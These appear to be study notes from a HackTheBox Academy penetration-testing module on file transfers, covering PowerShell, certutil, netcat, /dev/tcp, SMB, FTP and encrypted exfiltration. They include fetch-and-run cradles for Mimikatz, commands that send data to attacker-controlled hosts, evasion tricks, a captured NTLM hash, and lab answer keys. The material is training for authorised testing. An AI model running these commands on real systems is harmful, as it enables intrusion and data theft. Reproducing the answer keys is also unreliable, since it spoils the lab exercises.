# HackTheBox Academy 


## Module: File Transfers


### Windows File Transfer Methods


#### PowerShell Downloads


In most environments, HTTP/HTTPS traffic is allowed out of the firewall in some form - and if we have a GUI session, a web browser could also be used. However, from a Windows shell, PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP.

```
PS C:\htb> (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
```
From `PowerShell 3.0`, Invoke-WebRequest is also available, but it is noticeably slower at downloading files. The aliases iwr, curl, and wget can be used instead of Invoke-WebRequest.

```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias iex.

```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX also accepts pipeline input.

```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
```

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

This can be bypassed using the parameter -UseBasicParsing.

```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | iex

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
PS C:\htb> Invoke-CheckLocalAdminAccess

ComputerName IsAdmin
------------ -------
localhost      False
```

Alternatively, with administrative access to the machine, we can disable Internet Explorer’s First Run customization.

```
C:\htb> reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```

Powershell download cradles that do not observe Internet Explorer’s first-run check can also be used. Harmj0y has compiled an extensive list of PowerShell download cradles here. It is worth gaining familiarity with them and their individual nuances, such as not observing a proxy or touching a disk to select the appropriate one for the situation.

#### PowerShell File Uploads


It is also possible to upload files using Powershell using Invoke-WebRequest or Invoke-RestMethod.

```
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))

PS C:\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```

After catching the base64 data with Netcat, the payload can be decoded.

```
Waheed Nusrat@htb[/htb]$ echo <base64> | base64 -d -w 0 > bloodhound.zip
```

#### Bitsadmin


The Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user’s foreground work.

```
PS C:\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.


##### Download
```
PS C:\htb> Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```


##### Upload
```
PS C:\htb> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

### Certutil


Casey Smith (@subTee) found that certutil can be used to download arbitrary files. It is available in all Windows versions and has been a very popular file transfer technique, essentially serving as Wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious certutil usage.


##### Upload
```
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

## HTB Academy Question

`Note: Solution Can be found in the end of the file`

Q1: Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.
A: `b1a4ca918282fcd96004565521944a3b`

Q2: Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, RDP to the box, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.
A: `f458303ea783c224c6b4e7ef7f17eb9d`


### Linux File Transfer Methods


#### Wget / cURL


Wget and cURL are installed on many Linux distributions and support uploading as well as downloading files.

```
W4H33D@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

```
W4H33D@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

#### OpenSSL


OpenSSL is frequently installed and is also often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

##### Create certificate

```
W4H33D@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

### Stand up server


```
linux@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

### Download file


```
htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Bash (/dev/tcp)


There may also be situations where no obvious file transfer tools are available. In this case, as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/tcp device file can be used for simple file downloads.

#### Connect to Target's Webserver


```
htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

### HTTP GET Request


```
htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### Print the Response


```
htb[/htb]$ cat <&3
```


### PHP


PHP is also very prevalent and provides multiple file transfer methods.

 ### File_get_contents()
 

 ```
htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
 ```

 #### Fopen()
 

 ```
htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
 ```

If the php-curl module has been installed, this can alternatively be used.

 #### Php-curl
 

 ```
 htb[/htb]$ php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
 ```

It is also possible to retrieve each line as an array and pipe the output to bash.
 
 ```
 htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```


### Python


Python is often present on Linux and can be used to download files when Wget and cURL are not available. Although Python isn’t currently installed by default in Windows, typing Python in a command prompt opens the Windows Store's official distribution with a single-click install. Python is frequently installed on developer and IT computers and is bundled by default with major business financial applications such as Bloomberg (Bloomberg Professional Services).

### Python 2


```
htb[/htb]$ python2
```

#### Code: python

```
import urllib
urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
```

### Python 3


```
htb[/htb]$ python3
```

#### Code: python


```
import urllib.request
urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
```

##### Other Languages


Ruby, Perl, and Golang are some other popular languages that can also transfer files.

### Ruby


```
htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

### Perl


```
htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### Go



CODE: `go`

```
package main

import (
	 "os"
     "io"
     "net/http"
)

func main() {
     lfile, err := os.Create("LinEnum.sh")
     _ = err
     defer lfile.Close()

     rfile := "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
     response, err := http.Get(rfile)
     defer response.Body.Close()

     io.Copy(lfile, response.Body)
}

```

## HTB Academy Question


Note: The Solution can be found in the End of the File 

Q1: Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.
A: `5d21cf3da9c0ccb94f709e2559f3ea50`

Q2: Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, unzip the file, and run "hasher upload_nix.txt" from the command line. Submit the generated hash as your answer.
A: `159cfe5c65054bbadb2761cfa359c8b0`


### Catching Files over HTTP/SMB


### HTTP/S


This is the most common way most people will transfer files because HTTP/HTTPS are the most common protocols allowed through firewalls. Another immense benefit to this is that, in most cases, the file will be encrypted in transit. There is nothing worse than being on a Penetration Test, and a client's Network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption.

### Nginx Enable PUT


A good alternative for transferring files to Apache is NGINX because it is configuration is less complicated, and the module system does not lead to security issues like Apache can do.

When allowing HTTP Uploads, it is critical to be 100% positive users cannot upload web shells and then execute it. Apache makes it easy to shoot ourselves in the foot with this, as the PHP Module loves to execute anything ending in PHP. Configuring NGINX to use PHP is nowhere near as simple.

1. Create a directory to handle uploaded files.

```
htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

2. Change the owner to www-data.

```
htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

3. Create the NGINX Configuration file, by creating the file /etc/nginx/sites-available/upload.conf with the contents:

```
server {
     listen 9001;
     
     location /SecretUploadDirectory/ {
          root /var/www/uploads;
          dav_methods    PUT;
     }
}
```

4. Symlink our site to the sites-enabled directory.

```
htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

5. Start nginx.

```
htb[/htb]$ sudo systemctl restart nginx.service
```

6. If we get any error messages, be sure to check /var/log/nginx/error.log. If using Pwnbox, we will see port 80 is already in use.

```
root@localhost# tail -2 `/var/log/nginx/error.log`

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()

root@localhost#: ss -lnpt | grep `80`

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))

root@localhost#: ps -ef | grep `2811`

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811

```

7. We see there is already a module listening on port 80. To get around this, we can remove the default NGINX Configuration which binds on port 80.

```
htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```

Now we can test upload by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt

```
root@localhost# curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
root@localhost# tail -1 /var/www/upload/SecretUploadDirectory/users.txt 

user65:x:1000:1000:,,,:/home/user65:/bin/bash
```


Once we have this working, a good test is to make sure "File Listings" is not available by navigating to "http://localhost/SecretUploadDirectory". By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most of the files are sensitive by nature, and we want to do our best to hide them. Thanks to `NGINX` being minimal, features like that are not enabled by default.

### SMB


#### Impacket SMBServer


Impacket is my preferred method of setting up a file transfer over SMB because it does not run in the background or involve modifying configuration files. We can use smbserver.py specifically. If other people attempt to connect to the service, it has the bonus that it will display a NetNTLMv2 hash that, if successfully cracked, will reveal the password.

#### Impacket SMBServer - Syntax


```
htb[/htb]$ /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <share name> <location>
```

Note: On the Pwnbox prefix your command with sudo python3

It is essential always to have a separate order for file transfers to prevent unauthorized persons from gaining access to our local data. For example, if we would use our home directory to transfer the desired data and an unauthorized person accesses it, he will be able to navigate to the ".ssh" directory and find the SSH keys, which can be used against us.

We can set up an SMB share on our Pwnbox called "FileTransfer", but we create our folder for it before. Now we can share our current working directory.

```
htb[/htb]$ mkdir Transfers && cd Transfers
htb[/htb]$ /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support FileTransfer $(pwd)
```

To verify the share was created and accessible, we can run:

```
htb[/htb]$ sudo smbclient -L 127.0.0.1

Enter WORKGROUP\root's password: 

     Sharename       Type      Comment
     ---------       ----      -------
     IPC$            Disk      
     FileTransfer    Disk      
SMB1 disabled -- no workgroup available

```

Going to our Impacket terminal, we can see the connection and if we had not known the user's password before. We could use the line under "Authenticated Successfully" to Hashcat and attempt to crack it.

#### Impacket SMBServer - Listening


```
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (127.0.0.1,38928)
[*] AUTHENTICATE_MESSAGE (WORKGROUP\root,PARROT)
[*] User PARROT\root authenticated successfully
[*] root::WORKGROUP:4141414141414141:926ebbd136be706117721fbcad821410:01010000000000008039147afabcd601a3099ada8208fd2c00000000010010004a006e00640046006700460075007000030010004a006e0064004600670046007500700002001000640062005a0054005300490054004b0004001000640062005a0054005300490054004b00070008008039147afabcd6010600040002000000080030003000000000000000000000000000000054af210c79b6f4bd986d404d7769e730cecdf6b2feec6c6d5cd8a765d98034bb0a0010000000000000000000000000000000000009001c0063006900660073002f003100320037002e0030002e0030002e00310000000000
[*] Connecting Share(1:IPC$)
[*] NetrShareEnum Level: 1
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (127.0.0.1,38928)
[*] Remaining connections []
```

In some cases, computers will not allow anonymous SMB connections. In this case, we may want to use the user/password flags to allow authentication on our SMB server. This can be done with the following command:

```
htb[/htb]$ /usr/share/doc/python3-impacket/examples/smbserver.py -user USERNAME -password PASSWORD FileTransfer $(pwd)
```

As we have seen, there are a few quick and easy ways to transfer files over HTTP and SMB. Aside from their real-world applications, these examples can be used on the provided Pwnbox during any module that requires a file transfer (i.e., transferring a zip file containing BloodHound data collected during the Active Directory BloodHound module.


Miscellaneous File Transfer Methods
===================================

Web Servers
-----------

In addition to Apache and NGINX, it is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed or access to the Internet, so a mini web server can be used. What they perhaps lack in security, they make up for in flexibility, as the webroot location and listening ports can quickly be changed.


Python 2
--------

```
htb[/htb]$ python -m SimpleHTTPServer 8080
```

Python 3
--------

```
htb[/htb]$ python3 -m http.server 8080
```

Ruby
----

```
htb[/htb]$ ruby -run -ehttpd . -p8080
```

PHP
---

```
htb[/htb]$ php -S 0.0.0.0:8080
```

Socat
-----

```
htb[/htb]$ socat TCP-LISTEN:8080,reuseaddr,fork
```

With administrative access to a Windows machine, IIS can be easily installed.

```
PS C:\htb> Add-WindowsFeature Web-Server, Web-Mgmt-Tools
```

SMB / WebDAV
------------

SMB is a good option for file transfers, as on Windows as you don’t need to install anything. SMB traffic features prominently on networks, and SMB file transfers to Windows computers are expected. Unfortunately, it’s also the case that outbound SMB traffic is often allowed through the external firewall. In case SMB traffic through the firewall has been restricted, WebDAV may be a good option, as it relies on HTTP as a transport protocol. Some common tools that support file transfers from SMB and WebDAV shares are reviewed below.

PowerShell
----------

 Copy-Item
 ---------

 ```
 PS C:\htb> Copy-Item -Path C:\Temp\nc.exe -Destination C:\Temp\nc.exe -ToSession $session
 ```
 
 Set-Content
 -----------

 ```
 PS C:\htb> $file = Get-Content C:\Temp\nc.exe -Raw

 PS C:\htb> Invoke-Command -ComputerName 10.10.10.132 -ScriptBlock {Set-Content -Path C:\Temp\nc.exe -value $using:file}
 ```
 
 Copy / xcopy / robocopy
 -----------------------

 ```
 PS C:\htb> xcopy \\10.10.10.132\share\nc.exe nc.exe
 
 PS C:\htb> copy C:\Temp\nc.exe \\10.10.10.132\c$\Temp\nc.exe
 ```

 Map / Mount Drives
 ------------------

 ```
 PS C:\htb> net use Q: \\10.10.10.132\share
 
 PS C:\htb> pushd \\10.10.10.132\share
 
 PS C:\htb> mklink /D share \\10.10.10.132\share

 ```

 ```
 htb[/htb]$ smbclient //10.10.10.132/share -U username -W domain
 ```

Netcat
------

Netcat is a very versatile tool that also allows file transfers. The target or attacking machine can be used to initiate the connection, which is useful if a firewall prevents access to the target. The commands below both result in Mimikatz being transferred to the target computer.

Connection Initiated by Pentester
---------------------------------

```
victim@target:~$ nc -nlvp 8000 > mimikatz.exe
```

```
htb[/htb]$ nc -nv 10.10.10.132 8000 <mimikatz.exe
```

Connection Initiated by Target
------------------------------

```
htb[/htb]$ nc -nv 10.10.10.32 8000 > mimikatz.exe
```

```
victim@target:~$ nc -nlvp 8000 <mimikatz.exe
```

Netcat can also serve content for transfer by the /dev/tcp device file.

Start Netcat Listener
---------------------

```
htb[/htb]$ nc -lvnp 80 <LinEnum.sh
```

Download The File
-----------------

```
victim@target:~$ cat < /dev/tcp/10.10.10.32/80 > LinEnum.sh
```

SCP
---

The OpenSSH client is available by default on Linux and has been included in Windows 10 and Windows Server 2019 since Autumn 2018. On Windows, the OpenSSH server can be enabled using this [procedure](https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse). On older Windows systems, the PuTTY Secure Copy client (pscp.exe) can be used.

SCP Upload
----------

```
PS C:\htb> scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
```

SCP Download
------------

```
Waheed Nusrat@htb[/htb]$ scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

FTP
---

Windows 10 includes a native FTP client, which can also read commands from a script to work in a non-interactive shell.

Ftp-script.txt
--------------

```
open 10.10.10.32
anonymous
anonymous
lcd C:\Temp
get nc.exe
quit
```

FTP Transfer
------------

```
PS C:\htb> ftp -s:ftp-script.txt
```

TFTP
----

The TFTP client is not available by default in Windows, but it can be enabled using DISM. \

```
PS C:\htb> DISM /online /Enable-Feature /FeatureName:TFTP
```

In newer versions of Windows, the Install-WindowsFeature PowerShell cmdlet can also be used. Both DISM and Install-WindowsFeature require administrative access.

```
PS C:\htb> Install-WindowsFeature TFTP-Client
```

RDP
---

Remote Desktop is often enabled on Windows machines, and from Linux, **rdesktop** can be used to expose a local folder in the remote RDP session.

```
Waheed Nusrat@htb[/htb]$ rdesktop 10.10.10.132 -r disk:linux='/home/user/rdesktop/files'
```

Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.

After selecting the drive, we can interact with it in the remote session as follows:

```
PS C:\htb> copy \\tsclient\c\temp\mimikatz.exe .
```

This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

Echo Copy
---------

On machines with a very stringent lockdown policy, it may be necessary to echo copy files. Let’s examine how nc.exe can be transferred to a target Windows computer using this method.

Echo copying files is very inefficient and can result in a large amount of data being transferred across the clipboard, so we can use an executable packer such as [UPX](https://github.com/upx/upx/releases) to make the source file as small as possible.

```
Waheed Nusrat@htb[/htb]$ upx --best nc.exe
```

Next, we need to convert the binary data to base64. Windows contains a native utility that can do this - certutil.

```
PS C:\htb> certutil.exe -encode nc.exe nc.txt
```

Open the resulting text file in a text editor that supports the replacement of extended characters (\n \r \t \0 \x...), such as Notepad++. Replace newlines with echo ".

```
Find:\n
Replace:echo "
```

The first line doesn’t contain this, so we can manually prepend echo " to the first line. Next, we replace \r with " >> nc.txt\r.

``
Find:\r
Replace:" >> nc.txt\r
``

If the last line has an echo " on its own, remove it.

Next, copy all the text, and paste it into the shell, pressing enter if needed on the last command. This time, use the -decode certutil switch to convert the base64 text back to binary.

```
PS C:\htb> certutil.exe -decode nc.txt nc.exe
PS C:\htb> cmd /c "nc.exe -h 2>&1"
```

OpenSSL base64
--------------

If OpenSSL is available on the target system, this can also be used to encode and decode the data in place of certutil.

Encryption
----------

```
PS C:\htb> openssl.exe enc -base64 -in nc.exe -out nc.txt
```

Decryption
----------

```
PS C:\htb> openssl.exe enc -base64 -d -in nc.txt -out nc.exe
```

JavaScript
----------

The following JavaScript, based on this [post](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068), can be used.

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

It can be executed as follows.

```
PS C:\htb> cscript /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

VBScript
--------

The following VBScript, based on this [post](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs) can be used.

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

It can be executed as follows.

```
PS C:\htb> cscript /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

Protected File Transfers
========================

As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), enumeration data that can contain key information about the organization's network infrastructure, and Active Directory (AD) environment, etc. . Therefore, it is essential to encrypt such information or use encrypted data connections such as SSH, SFTP, and HTTPS. However, it is possible that these options are not available to us and that a different approach is required.

`Note: Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Rather, if attempting to test Data Loss Prevention controls/egress filtering protections create a file with dummy data that mimics the data that the client is trying to protect.`


Therefore, it is often necessary to encrypt the data or files before transfer to prevent the data from being read if they are intercepted in transit.

A data leakage during a penetration test could have serious consequences, both for the penetration tester and their company and the client. As information security professionals, it is our duty to act professionally and responsibly and take all measures to protect any data that we come across during an assessment.

File Encryption on Windows
--------------------------

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.

Invoke-AESEncryption.ps1
------------------------

###### Description

Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
`` 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
``
###### Description

Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 ```
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 ```
###### Description

Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 ```
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
 ```
###### Description

Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
```
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

For the creation of the script on the target system, the known transfer methods can be used. After the script has been transferred, it only needs to be imported as a module.

Import Module
-------------

```
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

After the script is imported, it can encrypt the strings or files as with the given examples. This command creates an encrypted file with the same name as the encrypted file, but with the extension ".aes."

File Encryption
---------------

```
PS C:\htb> Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```

It is essential to use very strong and unique passwords for encryption for every company where a penetration test is performed. This is to prevent that such files and information cannot be decrypted using one single password that may have been leaked and cracked by a third party.

One of the easiest ways to transfer files from Windows to Linux is FTP. This can be done using the pyftpdlib module of Python 3. If it is not yet installed on the Linux system, it can be installed with the following command:

Install pyftpdlib
-----------------

```
htb[/htb]$ pip3 install pyftpdlib
```

If the module already exists, it should be started with specified credentials.

Python3 FTP Server
------------------

```
htb[/htb]$ python3 -m pyftpdlib --user=pentester --password=p4ssw0rd -w

[I 2020-11-18 12:22:37] concurrency model: async
[I 2020-11-18 12:22:37] masquerade (NAT) address: None
[I 2020-11-18 12:22:37] passive ports: None
[I 2020-11-18 12:22:37] >>> starting FTP server on 0.0.0.0:2121, pid=3954 <<<
```

By default, this FTP server runs on TCP port 2121. After the FTP server is set up, the transfer can be done by the Windows system. The pre-installed FTP client from Windows is used for this.

File Transfer
-------------

```
PS C:\htb> ftp

ftp> open 10.10.14.2 2121

Connected to 10.10.14.2.
220 pyftpdlib 1.5.6 ready.
530 Log in with USER and PASS first.
User (10.10.14.2:(none)): pentester

331 Username ok, send password.
Password: p4ssw0rd

230 Login successful.
ftp> put scan-results.txt.aes

200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp: 3448 bytes sent in 0.00Seconds 34000.00Kbytes/sec.
ftp> bye

221 Goodbye.
```

As soon as the transfer is done, this can be verified on the Linux system. The FTP server shows any activity that is being done on it.

Receiving File
--------------

```
<...SNIP...>
[I 2020-11-18 12:22:37] >>> starting FTP server on 0.0.0.0:2121, pid=3954 <<<
[I 2020-11-18 12:22:50] 10.129.2.128:53388-[] FTP session opened (connect)
[I 2020-11-18 12:22:55] 10.129.2.128:53388-[pentester] USER 'pentester' logged in.
[I 2020-11-18 12:23:02] 10.129.2.128.128:53388-[pentester] STOR /home/htb-student/htb/scan-results.txt.aes completed=1 bytes=34 seconds=0.026
[I 2020-11-18 12:23:05] 10.129.2.128:53388-[pentester] FTP session closed (disconnect).
[I 2020-11-18 12:24:23] received interrupt signal
[I 2020-11-18 12:24:23] >>> shutting down FTP server, 1 socket(s), pid=3954 <<<
```

